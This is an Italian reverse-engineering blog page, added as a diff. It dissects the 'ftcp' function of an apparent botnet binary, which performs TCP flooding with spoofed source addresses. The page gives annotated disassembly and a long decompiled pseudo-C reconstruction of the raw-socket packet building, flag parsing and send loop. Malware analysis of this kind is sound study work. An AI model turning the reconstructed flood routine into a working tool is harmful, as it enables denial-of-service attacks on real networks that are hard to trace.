@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:image" content="https://spaghetti-hacker.github.io/ftcp.png">
+<meta property="og:image:width" content="1024">
+<meta property="og:image:height" content="400">
+<meta property="og:title" content="FTCP">
+<meta property="og:description" content=";reverse engineering della funzione listFork, estratta da un binario malevolo.">
+<meta property="og:type" content="article">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://spaghetti-hacker.github.io/ftcp.png">
+
+
+<title>SOCK PRINTF</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="stylesheet" href="hcf2.css">
+</head>
+<body>
+<div class="wrapper">
+<img src="https://spaghetti-hacker.github.io/ftcp.png" alt="banner" style="width:100%;display:block;">
+<div id="output"></div>
+</div>
+<!--
+================================================================
+SCRIVI QUI IL TUO CONTENUTO
+================================================================
+
+REGOLE:
+  - La prima riga non vuota diventa il titolo della pagina
+    e l'intestazione del box (es. "NO_ELF ~ HCF")
+
+  - @@@...@@@ → blocco codice/assembly (pre-wrap, sfondo scuro)
+
+  - Testo normale → commento (colore muted, paragrafi separati
+    da righe vuote)
+
+  - I link si scrivono normalmente in HTML: <a href="...">testo</a>
+    Il parser li lascia passare nei commenti senza escapare.
+
+  - Tutto il contenuto finisce dentro un unico div.article,
+    esattamente come in no_elf.html.
+
+================================================================
+ESEMPIO:
+
+NO_ELF ~ HCF
+
+<a href="https://spaghetti-hacker.github.io/">&lt;&lt;</a>
+
+;primo commento introduttivo.
+
+;secondo paragrafo del commento.
+
+@@@
+0x00400806 push rbp
+0x00400807 mov rbp, rsp
+@@@
+
+;commento sul blocco qui sopra.
+
+@@@
+0x004008ea ret
+@@@
+
+;commento finale.
+<a href="https://spaghetti-hacker.github.io/">&lt;&lt;</a>
+================================================================
+-->
+<script id="content" type="text/plain">
+FTCP ~ HCF
+
+<a href="https://spaghetti-hacker.github.io/">index.html</a>
+
+visite: <span id="visits">...</span>
+
+;la funzione ftcp implementa un attacco di tipo TCP flood con IP spoofing. Accetta come parametri l'host target, la porta, la durata dell'attacco, un prefisso CIDR per la generazione degli IP sorgente, una stringa di flag TCP, la dimensione del payload e il numero di pacchetti per burst. Costruisce manualmente pacchetti IP/TCP raw, randomizzando l'IP sorgente ad ogni iterazione per rendere difficile il tracciamento e il filtraggio.
+
+;setup della porta di destinazione
+
+@@@
+0x004019f6    cmp dword [var_6ch], 0
+0x004019fa    jne 0x401a07
+0x004019fc    call sym.rand_cmwc
+0x00401a01    mov word [var_4eh], ax
+0x00401a05    jmp 0x401a16
+0x00401a07    mov eax, dword [var_6ch]
+0x00401a0a    movzx edi, ax
+0x00401a0d    call sym.htons
+0x00401a12    mov word [var_4eh], ax
+@@@
+
+;se la porta è 0 viene generata casualmente tramite rand_cmwc, altrimenti convertita in network byte order con htons.
+
+;apertura socket raw e opzione IP_HDRINCL
+
+@@@
+0x00401a3f    mov edx, 6
+0x00401a44    mov esi, 3
+0x00401a49    mov edi, 2
+0x00401a4e    call sym.socket
+0x00401a53    mov dword [sockfd], eax
+0x00401a61    mov dword [optval], 1
+0x00401a6f    mov r8d, 4
+0x00401a75    mov edx, 3
+0x00401a7a    mov esi, 0
+0x00401a7f    call sym.__GI_setsockopt
+@@@
+
+;socket raw AF_INET/SOCK_RAW/IPPROTO_TCP; setsockopt con IP_HDRINCL=1 consente la costruzione manuale dell'header IP.
+
+;calcolo della netmask dal prefisso CIDR
+
+@@@
+0x00401a8d    cmp dword [var_74h], 0
+0x00401a91    jne 0x401a9c
+0x00401a93    mov dword [var_34h], 0
+0x00401a9a    jmp 0x401ab2
+0x00401a9c    mov eax, 0x20
+0x00401aa1    mov ecx, eax
+0x00401aa3    sub ecx, dword [var_74h]
+0x00401aa6    mov eax, 1
+0x00401aab    shl eax, cl
+0x00401aad    neg eax
+0x00401aaf    mov dword [var_34h], eax
+@@@
+
+;-(1 << (32 - prefix)) genera la netmask; se il prefisso è 0 la maschera è nulla e gli IP sorgente vengono generati su tutto lo spazio IPv4.
+
+;generazione IP sorgente random e costruzione pacchetto
+
+@@@
+0x00401b2a    mov edi, dword [var_34h]
+0x00401b2d    call sym.getRandomIP
+0x00401b32    mov edi, eax
+0x00401b34    call sym.htonl
+0x00401b3c    mov rdi, qword [var_30h]
+0x00401b43    mov ecx, 6
+0x00401b4a    call sym.makeIPPacket
+@@@
+
+;IP sorgente generato casualmente entro la subnet definita dalla netmask, convertito in network byte order e scritto nell'header IP tramite makeIPPacket.
+
+;parsing dei flag TCP tramite repe cmpsb
+
+@@@
+0x00401c40    mov qword [var_d8h], 0x40baca ;"syn"
+0x00401c9f    mov qword [var_f0h], 0x40bace ;"rst"
+0x00401cfe    mov qword [var_108h], 0x40bad2 ;"fin"
+0x00401d5d    mov qword [var_120h], 0x40bad6 ;"ack"
+0x00401db9    mov qword [var_138h], 0x40bada ;"psh"
+0x00401b92    mov qword [var_c0h], 0x40bac4 ;"all"
+0x00401c56    cld
+0x00401c57    mov rsi, qword [var_d0h]
+0x00401c5e    mov rdi, qword [var_d8h]
+0x00401c65    mov rcx, qword [var_e0h]
+0x00401c6c    repe cmpsb byte [rsi], byte [rdi]
+0x00401c7f    jne 0x401c94
+0x00401c81    movzx edx, byte [rax + 0xd]
+0x00401c85    or edx, 2
+0x00401c89    mov byte [rax + 0xd], dl
+@@@
+
+;repe cmpsb implementa un memcmp inline su 4 byte per confrontare il token corrente con le stringhe "syn", "rst", "fin", "ack", "psh"; il bit corrispondente viene impostato nel byte dei flag TCP all'offset 0xd dell'header. Se abbiamo la stringa "all" allora i flag sono tutti attivi. Flag TCP configurabili (SYN, ACK, RST, FIN, PSH o tutti)
+
+;loop di flood con rerandomizzazione
+
+@@@
+0x00401efc    call sym.sendto
+0x00401eff    call sym.getRandomIP
+0x00401f06    call sym.htonl
+0x00401f0b    mov dword [rax + 0xc], edx
+0x00401f14    call sym.rand_cmwc
+0x00401f1f    mov word [rax + 4], dx
+0x00401f23    call sym.rand_cmwc
+0x00401f51    call sym.tcpcsum
+0x00401f72    call sym.csum
+0x00401f87    cmp dword [var_88h], edi
+0x00401f8d    jne 0x401fb3
+0x00401f94    call sym.__GI_time
+0x00401f9f    cmp rax, rdx
+0x00401fa2    jg 0x401fbe
+@@@
+
+;ad ogni iterazione vengono rerandomizzati IP sorgente, IP identification e sequence number TCP, con ricalcolo dei checksum; il loop
+interno conta i pacchetti per burst, quello esterno controlla la scadenza tramite time().
+
+;i packets per burst sono semplicemente il numero di pacchetti inviati consecutivamente prima di fare un controllo temporale o una micro-pausa logica nel loop.
+
+;ftcp è un modulo di flooding TCP con IP spoofing, probabilmente parte di un botnet o tool DDoS. I tratti distintivi sono la costruzione manuale dei pacchetti tramite socket raw, la generazione di IP sorgente casuali vincolati a una subnet CIDR, il parsing flessibile dei flag TCP e il meccanismo di burst temporizzato. L'uso di repe cmpsb al posto di strcmp e la gestione manuale dei checksum suggeriscono un binario compilato con ottimizzazioni moderate e senza librerie esterne per la manipolazione dei pacchetti.
+
+;reversing della funzione in pseudo-C:
+
+@@@
+void ftcp(undefined8 param_1,int param_2,int param_3,int param_4,byte *param_5,int param_6,
+         int param_7)
+
+{
+  size_t __n;
+  undefined2 *puVar1;
+  byte bVar2;
+  undefined2 rand4;
+  int risultato_generico;
+  int total_length;
+  uint32_t random_IP;
+  undefined4 rand5;
+  time_t tVar3;
+  long cmp_len;
+  byte *pbVar4;
+  byte *pbVar5;
+  byte *pbVar6;
+  bool bVar7;
+  bool bVar8;
+  bool bVar9;
+  undefined8 checkpoint [2];
+  undefined1 *local_140;
+  byte *local_138;
+  undefined8 local_130;
+  undefined1 *local_128;
+  byte *local_120;
+  undefined8 local_118;
+  undefined1 *local_110;
+  byte *local_108;
+  undefined8 local_100;
+  undefined1 *local_f8;
+  byte *local_f0;
+  undefined8 local_e8;
+  undefined1 *local_e0;
+  byte *local_d8;
+  undefined8 local_d0;
+  undefined1 *local_c8;
+  byte *local_c0;
+  size_t packet_size;
+  void *packet_alloc;
+  uint16_t tcp_dst_port;
+  undefined8 *local_a0;
+  int packets_per_burst;
+  int burst_counter;
+  int payload_size;
+  byte *flag_str;
+  int cidr_prefix;
+  int duration_sec;
+  int dest_port;
+  undefined8 target_host;
+  undefined4 optval;
+  sockaddr dest_addr;
+  void *packet_start;
+  int endpoint;
+  int netmask;
+  void *ip_header_ptr;
+  undefined2 *tcp_header_ptr;
+  int end_time;
+  byte *current_flag_token;
+  void *packet_buf;
+  long stack_offset;
+
+  local_a0 = checkpoint + 1;
+  packets_per_burst = param_7;
+  dest_addr.sa_family = 2;
+  payload_size = param_6;
+  flag_str = param_5;
+  cidr_prefix = param_4;
+  duration_sec = param_3;
+  dest_port = param_2;
+  target_host = param_1;
+  if (param_2 == 0) {
+    checkpoint[0] = 0x401a01;
+    local_a0 = checkpoint + 1;
+    dest_addr.sa_data._0_2_ = rand_cmwc();
+  }
+  else {
+    checkpoint[0] = 0x401a12;
+    dest_addr.sa_data._0_2_ = htons((uint16_t)param_2);
+  }
+  checkpoint[0] = 0x401a27;
+  risultato_generico = getHost(target_host,dest_addr.sa_data + 2);
+  if (risultato_generico == 0) {
+    dest_addr.sa_data[6] = '\0';
+    dest_addr.sa_data[7] = '\0';
+    dest_addr.sa_data[8] = '\0';
+    dest_addr.sa_data[9] = '\0';
+    dest_addr.sa_data[10] = '\0';
+    dest_addr.sa_data[0xb] = '\0';
+    dest_addr.sa_data[0xc] = '\0';
+    dest_addr.sa_data[0xd] = '\0';
+    checkpoint[0] = 0x401a53;
+    endpoint = socket(2,3,6);
+    if (endpoint != 0) {
+      optval = 1;
+      checkpoint[0] = 0x401a84;
+      risultato_generico = setsockopt(endpoint,0,3,&optval,4);
+      if (-1 < risultato_generico) {
+        if (cidr_prefix == 0) {
+          netmask = 0;
+        }
+        else {
+          netmask = -(1 << (-(char)cidr_prefix & 0x1fU));
+        }
+        risultato_generico = netmask;
+        packet_size = (long)payload_size + 0x28;
+        stack_offset = -((long)payload_size + 0x46U & 0xfffffffffffffff0);
+        packet_alloc = (void *)((long)&local_140 + stack_offset);
+        tcp_header_ptr = (undefined2 *)((long)&local_130 + stack_offset + 4);
+        total_length = payload_size + 0x14;
+        packet_start = packet_alloc;
+        ip_header_ptr = packet_alloc;
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401b32;
+        random_IP = getRandomIP(risultato_generico);
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401b39;
+        random_IP = htonl(random_IP);
+        packet_buf = ip_header_ptr;
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401b4f;
+        makeIPPacket(packet_buf,dest_addr.sa_data._2_4_,random_IP,6,total_length);
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401b54;
+        rand4 = rand_cmwc();
+        *tcp_header_ptr = rand4;
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401b62;
+        rand5 = rand_cmwc();
+        pbVar5 = flag_str;
+        *(undefined4 *)(tcp_header_ptr + 2) = rand5;
+        *(undefined4 *)(tcp_header_ptr + 4) = 0;
+        bVar7 = false;
+        bVar2 = *(byte *)(tcp_header_ptr + 6) & 0xf | 0x50;
+        bVar9 = bVar2 == 0;
+        *(byte *)(tcp_header_ptr + 6) = bVar2;
+        local_c0 = flag_str;
+        local_c8 = &DAT_0040bac4;
+        local_d0 = 4;
+        cmp_len = 4;
+        pbVar4 = flag_str;
+        pbVar6 = &DAT_0040bac4;
+        do {
+          if (cmp_len == 0) break;
+          cmp_len = cmp_len + -1;
+          bVar7 = *pbVar4 < *pbVar6;
+          bVar9 = *pbVar4 == *pbVar6;
+          pbVar4 = pbVar4 + 1;
+          pbVar6 = pbVar6 + 1;
+        } while (bVar9);
+        if ((!bVar7 && !bVar9) == bVar7) {
+          *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 2;
+          *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 4;
+          *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 1;
+          *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 0x10;
+          *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 8;
+        }
+        else {
+          *(undefined8 *)((long)checkpoint + stack_offset) = 0x401c2c;
+          current_flag_token = (byte *)strtok((char *)pbVar5,",");
+          while (bVar7 = false, current_flag_token != (byte *)0x0) {
+            local_d8 = current_flag_token;
+            local_e0 = &DAT_0040baca;
+            local_e8 = 4;
+            cmp_len = 4;
+            bVar9 = false;
+            pbVar5 = current_flag_token;
+            pbVar4 = &DAT_0040baca;
+            do {
+              if (cmp_len == 0) break;
+              cmp_len = cmp_len + -1;
+              bVar7 = *pbVar5 < *pbVar4;
+              bVar9 = *pbVar5 == *pbVar4;
+              pbVar5 = pbVar5 + 1;
+              pbVar4 = pbVar4 + 1;
+            } while (bVar9);
+            bVar8 = false;
+            bVar7 = (!bVar7 && !bVar9) == bVar7;
+            if (bVar7) {
+              *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 2;
+            }
+            else {
+              local_f0 = current_flag_token;
+              local_f8 = &DAT_0040bace;
+              local_100 = 4;
+              cmp_len = 4;
+              pbVar5 = current_flag_token;
+              pbVar4 = &DAT_0040bace;
+              do {
+                if (cmp_len == 0) break;
+                cmp_len = cmp_len + -1;
+                bVar8 = *pbVar5 < *pbVar4;
+                bVar7 = *pbVar5 == *pbVar4;
+                pbVar5 = pbVar5 + 1;
+                pbVar4 = pbVar4 + 1;
+              } while (bVar7);
+              bVar9 = false;
+              bVar7 = (!bVar8 && !bVar7) == bVar8;
+              if (bVar7) {
+                *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 4;
+              }
+              else {
+                local_108 = current_flag_token;
+                local_110 = &DAT_0040bad2;
+                local_118 = 4;
+                cmp_len = 4;
+                pbVar5 = current_flag_token;
+                pbVar4 = &DAT_0040bad2;
+                do {
+                  if (cmp_len == 0) break;
+                  cmp_len = cmp_len + -1;
+                  bVar9 = *pbVar5 < *pbVar4;
+                  bVar7 = *pbVar5 == *pbVar4;
+                  pbVar5 = pbVar5 + 1;
+                  pbVar4 = pbVar4 + 1;
+                } while (bVar7);
+                bVar8 = false;
+                bVar7 = (!bVar9 && !bVar7) == bVar9;
+                if (bVar7) {
+                  *(byte *)((long)tcp_header_ptr + 0xd) = *(byte *)((long)tcp_header_ptr + 0xd) | 1;
+                }
+                else {
+                  local_120 = current_flag_token;
+                  local_128 = &DAT_0040bad6;
+                  local_130 = 4;
+                  cmp_len = 4;
+                  pbVar5 = current_flag_token;
+                  pbVar4 = &DAT_0040bad6;
+                  do {
+                    if (cmp_len == 0) break;
+                    cmp_len = cmp_len + -1;
+                    bVar8 = *pbVar5 < *pbVar4;
+                    bVar7 = *pbVar5 == *pbVar4;
+                    pbVar5 = pbVar5 + 1;
+                    pbVar4 = pbVar4 + 1;
+                  } while (bVar7);
+                  bVar9 = false;
+                  bVar7 = (!bVar8 && !bVar7) == bVar8;
+                  if (bVar7) {
+                    *(byte *)((long)tcp_header_ptr + 0xd) =
+                         *(byte *)((long)tcp_header_ptr + 0xd) | 0x10;
+                  }
+                  else {
+                    local_138 = current_flag_token;
+                    local_140 = &DAT_0040bada;
+                    checkpoint[1] = 4;
+                    cmp_len = 4;
+                    pbVar5 = current_flag_token;
+                    pbVar4 = &DAT_0040bada;
+                    do {
+                      if (cmp_len == 0) break;
+                      cmp_len = cmp_len + -1;
+                      bVar9 = *pbVar5 < *pbVar4;
+                      bVar7 = *pbVar5 == *pbVar4;
+                      pbVar5 = pbVar5 + 1;
+                      pbVar4 = pbVar4 + 1;
+                    } while (bVar7);
+                    if ((!bVar9 && !bVar7) == bVar9) {
+                      *(byte *)((long)tcp_header_ptr + 0xd) =
+                           *(byte *)((long)tcp_header_ptr + 0xd) | 8;
+                    }
+                  }
+                }
+              }
+            }
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401e17;
+            current_flag_token = (byte *)strtok((char *)0x0,",");
+          }
+        }
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401e2b;
+        rand4 = rand_cmwc();
+        risultato_generico = dest_port;
+        tcp_header_ptr[7] = rand4;
+        tcp_header_ptr[8] = 0;
+        tcp_header_ptr[9] = 0;
+        if (dest_port == 0) {
+          *(undefined8 *)((long)checkpoint + stack_offset) = 0x401e54;
+          tcp_dst_port = rand_cmwc();
+        }
+        else {
+          *(undefined8 *)((long)checkpoint + stack_offset) = 0x401e68;
+          tcp_dst_port = htons((uint16_t)risultato_generico);
+        }
+        puVar1 = tcp_header_ptr;
+        packet_buf = ip_header_ptr;
+        tcp_header_ptr[1] = tcp_dst_port;
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401e8b;
+        rand4 = tcpcsum(packet_buf,puVar1);
+        packet_buf = packet_start;
+        tcp_header_ptr[8] = rand4;
+        rand4 = *(undefined2 *)((long)ip_header_ptr + 2);
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401eac;
+        rand4 = csum(packet_buf,rand4);
+        *(undefined2 *)((long)ip_header_ptr + 10) = rand4;
+        *(undefined8 *)((long)checkpoint + stack_offset) = 0x401ec0;
+        tVar3 = time((time_t *)0x0);
+        end_time = (int)tVar3 + duration_sec;
+        burst_counter = 0;
+        while( true ) {
+          while( true ) {
+            risultato_generico = endpoint;
+            packet_buf = packet_start;
+            __n = packet_size;
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401efc;
+            sendto(risultato_generico,packet_buf,__n,0,&dest_addr,0x10);
+            risultato_generico = netmask;
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f04;
+            random_IP = getRandomIP(risultato_generico);
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f0b;
+            random_IP = htonl(random_IP);
+            *(uint32_t *)((long)ip_header_ptr + 0xc) = random_IP;
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f19;
+            rand4 = rand_cmwc();
+            *(undefined2 *)((long)ip_header_ptr + 4) = rand4;
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f28;
+            rand5 = rand_cmwc();
+            *(undefined4 *)(tcp_header_ptr + 2) = rand5;
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f36;
+            rand4 = rand_cmwc();
+            puVar1 = tcp_header_ptr;
+            packet_buf = ip_header_ptr;
+            *tcp_header_ptr = rand4;
+            tcp_header_ptr[8] = 0;
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f56;
+            rand4 = tcpcsum(packet_buf,puVar1);
+            packet_buf = packet_start;
+            tcp_header_ptr[8] = rand4;
+            rand4 = *(undefined2 *)((long)ip_header_ptr + 2);
+            *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f77;
+            rand4 = csum(packet_buf,rand4);
+            *(undefined2 *)((long)ip_header_ptr + 10) = rand4;
+            if (burst_counter == packets_per_burst) break;
+            burst_counter = burst_counter + 1;
+          }
+          *(undefined8 *)((long)checkpoint + stack_offset) = 0x401f99;
+          tVar3 = time((time_t *)0x0);
+          if (end_time < tVar3) break;
+          burst_counter = 0;
+        }
+      }
+    }
+  }
+  return;
+}
+@@@
+
+<a href="https://spaghetti-hacker.github.io/">index.html</a>
+</script>
+<script>
+(function(){
+    const raw = document.getElementById('content').textContent;
+    const lines = raw.split('\n');
+    const output = document.getElementById('output');
+
+    let i = 0;
+
+    // salta righe vuote iniziali
+    while(i < lines.length && lines[i].trim() === '') i++;
+
+    // prima riga non vuota = titolo
+    const title = lines[i] ? lines[i].trim() : '';
+    if(title){
+        document.title = title;
+    }
+    i++;
+
+    // costruisce il contenuto dentro un unico div.article
+    // il titolo è il nodo di testo iniziale del box
+    let inner = escCode(title);
+    i; // già avanzato
+
+    while(i < lines.length){
+        const line = lines[i];
+
+        // blocco @@@ → codice pre-wrap
+        if(line.trim() === '@@@'){
+            i++;
+            let block = '';
+            while(i < lines.length && lines[i].trim() !== '@@@'){
+                block += lines[i] + '\n';
+                i++;
+            }
+            i++; // salta @@@ di chiusura
+            // il codice viene escapato tranne &lt; &gt; &amp; già scritti
+            //inner += escCode(block.replace(/\n$/, ''));
+	    inner += '<pre class="codeblock">' + escCode(block.replace(/\n$/, '')) + '</pre>';
+            continue;
+        }
+
+        // raccoglie testo fino al prossimo @@@
+        let textLines = [];
+        while(i < lines.length && lines[i].trim() !== '@@@'){
+            textLines.push(lines[i]);
+            i++;
+        }
+
+        const paragraphs = splitParagraphs(textLines);
+        if(paragraphs.length > 0){
+	    inner += '<div class="commento">\n';
+            for (const p of paragraphs){
+                const cleaned = p.replace(/\n/g, '<br>');
+                inner += '<p>' + cleaned + '</p>\n';
+                }
+            inner += '</div>';
+        }
+    }
+
+    output.innerHTML = '<div class="article">' + inner + '</div>';
+
+    // escapa solo il testo codice (non i commenti che possono avere HTML)
+    function escCode(str){
+        return str
+            .replace(/&(?!(?:amp|lt|gt|quot|#\d+);)/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+    }
+
+    function splitParagraphs(lines){
+        const result = [];
+        let current = [];
+        for(const line of lines){
+            if(line.trim() === ''){
+                if(current.length > 0){
+                    result.push(current.join('\n'));
+                    current = [];
+                }
+            } else {
+                current.push(line);
+            }
+        }
+        if(current.length > 0) result.push(current.join('\n'));
+        return result;
+    }
+})();
+</script>
+<script>
+fetch("https://api.counterapi.dev/v1/:spaghettihacker/:ftcp/up")
+  .then(res => res.json())
+  .then(data => {
+    const counter = data.count;
+
+    document.getElementById("visits").innerText =
+      counter !== undefined ? counter : "error";
+  })
+  .catch(() => {
+    document.getElementById("visits").innerText = "error";
+  });
+</script>
+</body>
+</html>
